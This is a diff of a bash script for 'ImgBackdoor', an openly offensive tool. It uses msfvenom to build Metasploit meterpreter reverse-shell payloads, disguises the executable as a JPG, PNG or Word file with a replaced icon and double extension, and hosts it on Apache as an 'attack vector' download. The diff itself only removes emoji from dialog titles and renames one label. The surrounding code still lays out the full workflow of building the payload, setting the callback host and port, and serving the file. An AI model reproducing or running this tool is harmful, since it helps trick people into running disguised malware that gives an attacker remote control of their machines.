@@ -64,7 +64,7 @@ case $DiStR0 in
     Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
     BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
     elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
-    *) IP=`zenity --title="🎭 Input your IP 🎭" --text "example: 192.168.1.68" --entry --width 300`;;
+    *) IP=`zenity --title="Input your IP" --text "example: 192.168.0.1" --entry --width 300`;;
   esac
 clear
 
@@ -188,7 +188,7 @@ cat << !
    'Edit setting file to select extention'
 
 !
-rUn=$(zenity --question --title="🎭 Image Backdoor 🎭" --text "Execute framework?" --width 270) > /dev/null 2>&1
+rUn=$(zenity --question --title="Image Backdoor" --text "Execute framework?" --width 270) > /dev/null 2>&1
 if [ "$PaLe" = "exe" ] && [ "$AuTo" = "YES" ]; then
   echo ${RedF}[x]${YellowF} "[settings] AUTO_PAYLOAD_BUILD=${RedF}$AuTo${YellowF} and PAYLOAD_EXTENSION=${RedF}$PaLe"${Reset};
   sleep 2
@@ -197,9 +197,9 @@ if [ "$PaLe" = "exe" ] && [ "$AuTo" = "YES" ]; then
 fi
 
   if [ "$?" -eq "0" ]; then
-    service apache2 start | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     if ! [ "$NoMsF" = "YES" ]; then
-    service postgresql start | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Start Metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT" --text="Start Metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
       if [ "$ChEk" = "ON" ]; then
         service postgresql start
         echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
@@ -207,7 +207,7 @@ fi
           if [ "$ih" != "connected" ]; then
             echo ${RedF}[x]${white}" postgresql selected, no connection .."${Reset};
             echo ${BlueF}[☆]${white}" Please wait, rebuilding msf database .."${Reset};
-            msfdb reinit | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+            msfdb reinit | zenity --progress --pulsate --title "PLEASE WAIT" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
             echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
             sleep 2
           else
@@ -222,18 +222,18 @@ fi
     clear
     echo ""
     echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
-    echo ${white}    Author${RedF}::${white}$ken ${RedF}::${white}[Ferdi S Kennedy]${Reset};
+    echo ${white}    Maintener${RedF}::${white}$ken ${RedF}::${white}[Ferdi S Kennedy]${Reset};
     echo ""
-    service apache2 stop | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     if ! [ "$NoMsF" = "YES" ]; then
-    service postgresql stop | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     fi
     exit
   fi
 
 
 if [ "$AuTo" = "YES" ]; then
-  paylo=$(zenity --list --title "🎭 AUTO-BUILD PAYLOAD 🎭" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
+  paylo=$(zenity --list --title "AUTO-BUILD PAYLOAD" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
   xterm -T " ImgBackdoor - build payload: .$PaLe " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$IP LPORT=$AhPu -f psh-cmd -o $IPATH/output/chars.raw" > /dev/null 2>&1
   cd $IPATH/output
   str0=`cat chars.raw | awk {'print $12'}`
@@ -243,33 +243,33 @@ if [ "$AuTo" = "YES" ]; then
   rm chars.raw > /dev/null 2>&1
   cd $IPATH
 else
-UpL=$(zenity --title "🎭 PAYLOAD TO BE TRANSFORMED (only .$PaLe) 🎭" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
+UpL=$(zenity --title "PAYLOAD TO BE TRANSFORMED (only .$PaLe)" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
 fi
 sleep 1
-JpG=$(zenity --title "🎭 IMAGE TO BE USED (only .$EtU) 🎭" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
+JpG=$(zenity --title "IMAGE TO BE USED (only .$EtU)" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
 sleep 1
 
 if [ "$FwDc" = "YES" ]; then
 PaTh="$IPATH/icons/Microsoft-Word.ico"
 else
   if [ "$EtU" = "jpg" ]; then
-  IcOn=$(zenity --list --title "🎭 ICON REPLACEMENT  🎭" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-black.ico" FALSE "JPG-white.ico" FALSE "JPG-green.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
+  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-black.ico" FALSE "JPG-white.ico" FALSE "JPG-green.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
   elif [ "$EtU" = "jpeg" ]; then
-  IcOn=$(zenity --list --title "🎭 ICON REPLACEMENT  🎭" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPEG-black.ico" FALSE "JPEG-white.ico" FALSE "JPEG-orange.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
+  IcOn=$(zenity --list --title "ICON REPLACEMENT " --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPEG-black.ico" FALSE "JPEG-white.ico" FALSE "JPEG-orange.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
   elif [ "$EtU" = "png" ]; then
-  IcOn=$(zenity --list --title "🎭 ICON REPLACEMENT  🎭" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "PNG-black.ico" FALSE "PNG-white.ico" FALSE "PNG-simple.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
+  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "PNG-black.ico" FALSE "PNG-white.ico" FALSE "PNG-simple.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
   else
-  IcOn=$(zenity --list --title "🎭 ICON REPLACEMENT  🎭" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-Ios7.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
+  IcOn=$(zenity --list --title "ICON REPLACEMENT" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-Ios7.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
   fi
   if [ "$IcOn" = "Input your own icon" ]; then
-    ImR=$(zenity --title "🎭 ICON REPLACEMENT 🎭" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
+    ImR=$(zenity --title "ICON REPLACEMENT" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
     PaTh="$ImR"
   else
     PaTh="$IPATH/icons/$IcOn"
   fi
 fi
 sleep 1
-MiP=$(zenity --title "🎭 PAYLOAD FINAL NAME 🎭" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1
+MiP=$(zenity --title "PAYLOAD FINAL NAME" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1
 clear
 cat << !
 
@@ -303,7 +303,7 @@ cd $IPATH
 if [ "$bYR" = "YES" ]; then
   echo ${YellowF}[☆]${white} Manually change icon.ico sellected ..${Reset};
   echo ${YellowF}[☆]${white} Use your favorite editor to change icon [trigger.exe]${Reset};
-  echo ${YellowF}[🎭] When finish, press any key to Continue ..${Reset};
+  echo ${YellowF}[☆] When finish, press any key to Continue ..${Reset};
   read op
   mv $IPATH/output/trigger.exe $IPATH/output/agent.exe > /dev/null 2>&1
 
@@ -364,9 +364,9 @@ fi
     sleep 2
 
     if [ "$NoMsF" = "YES" ]; then
-      echo ${BlueF}[🎭]${white} Metamorphosis: completed ..${Reset};
+      echo ${BlueF}[☆]${white} Metamorphosis: completed ..${Reset};
       sleep 2
-      echo ${YellowF}[🎭] Start your own handler now '(listener)' ..${Reset};
+      echo ${YellowF}[☆] Start your own handler now '(listener)' ..${Reset};
       sleep 2
       rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
       rm $IPATH/output/trigger.exe > /dev/null 2>&1
@@ -375,7 +375,7 @@ fi
       echo ${RedF}"    AGENT: $IPATH/output/$MiP.$EtU.exe"${Reset};
       echo ""
       sleep 1
-      echo ${YellowF}[🎭] When finish, press any key to Exit ImgBackdoor ..${Reset};
+      echo ${YellowF}[☆] When finish, press any key to Exit ImgBackdoor ..${Reset};
       read op
 
     else
@@ -395,16 +395,16 @@ fi
         mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
         cd $IPATH
       fi
-        echo ${BlueF}[🎭]${white} Metamorphosis: completed ..${Reset};
+        echo ${BlueF}[☆]${white} Metamorphosis: completed ..${Reset};
         rm $IPATH/output/trigger.exe > /dev/null 2>&1
         sleep 2
           if [ "$AuTo" = "YES" ]; then
             lhost="$IP"
             lport="$AhPu"
           else
-            lhost=$(zenity --title="🎭 Enter binary.exe LHOST 🎭" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-            lport=$(zenity --title="🎭 Enter binary.exe LPORT 🎭" --text "example: $AhPu" --entry --width 300) > /dev/null 2>&1
-            paylo=$(zenity --list --title "🎭 ImgBackdoor 🎭" --text "\nChose payload used by binary.exe:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
+            lhost=$(zenity --title="Enter binary.exe LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+            lport=$(zenity --title="Enter binary.exe LPORT" --text "example: $AhPu" --entry --width 300) > /dev/null 2>&1
+            paylo=$(zenity --list --title "ImgBackdoor" --text "\nChose payload used by binary.exe:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
           fi
           echo ""
           echo ${RedF}"    ATTACK VECTOR: http://$IP/$MiP.zip"${Reset};
@@ -428,8 +428,8 @@ fi
     echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
     echo ${white}    Author${RedF}::${white}$ken ${RedF}::${white}[Ferdi S Kennedy]${Reset};
     sleep 1
-    service apache2 stop | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     if ! [ "$NoMsF" = "YES" ]; then
-    service postgresql stop | zenity --progress --pulsate --title "🎭 PLEASE WAIT 🎭" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     fi
 exit
